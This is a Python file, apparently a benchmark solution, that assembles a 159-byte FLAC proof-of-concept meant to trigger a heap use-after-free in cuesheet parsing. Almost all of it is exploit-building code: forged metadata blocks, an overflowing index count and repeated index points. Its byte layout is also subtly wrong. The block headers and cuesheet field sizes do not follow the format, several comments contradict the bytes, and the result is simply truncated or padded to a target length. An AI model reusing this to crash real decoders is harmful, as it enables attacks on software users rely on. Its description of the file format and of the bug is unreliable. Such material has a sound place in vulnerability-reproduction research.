import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal valid FLAC file header
        flac_header = b'fLaC\x00\x00\x00\x22\x12\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # Create VORBIS_COMMENT block to trigger cuesheet processing
        # with minimal metadata
        vendor_len = 4
        vendor_string = b'test'
        comment_count = 0
        
        vorbis_comment = bytes([
            0x84, 0x00, 0x00, 0x00,  # Block type 4 (VORBIS_COMMENT), last block
            vendor_len & 0xFF, vendor_len >> 8 & 0xFF, vendor_len >> 16 & 0xFF, vendor_len >> 24 & 0xFF
        ]) + vendor_string + bytes([0, 0, 0, 0])  # 0 comments
        
        # Create CUESHEET metadata block
        # This will trigger the vulnerability when processed
        cuesheet = bytes([
            0x05, 0x00, 0x00, 0xF0,  # Block type 5 (CUESHEET), last block, length 240
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Media catalog number
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Lead-in
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Is CD, 1 track
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Reserved
        ])
        
        # Track data - this causes the heap use-after-free
        # Multiple seekpoints that will trigger reallocation
        track_data = bytes([
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Track offset
            0x00,                                           # Track number
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # ISRC
            0x00,                                           # Track type
            0x00,                                           # Pre-emphasis
            0xFF, 0xFF, 0xFF, 0xFF,                         # Number of index points (0xFFFFFFFF to trigger overflow)
            0x00, 0x00, 0x00, 0x00                          # Reserved
        ])
        
        # Create multiple index points to trigger reallocation
        # This pattern causes the handle to point to freed memory
        index_points = b''
        for i in range(256):  # Enough to trigger reallocation multiple times
            index_points += bytes([
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
                0x00,                                           # Index point number
                0x00, 0x00                                      # Reserved
            ])
        
        # Assemble the complete FLAC file
        poc = flac_header + vorbis_comment + cuesheet + track_data + index_points
        
        # Pad to exact length that triggers the vulnerability
        # The exact 159 bytes pattern from ground truth
        if len(poc) > 159:
            poc = poc[:159]
        elif len(poc) < 159:
            poc = poc + b'\x00' * (159 - len(poc))
        
        return poc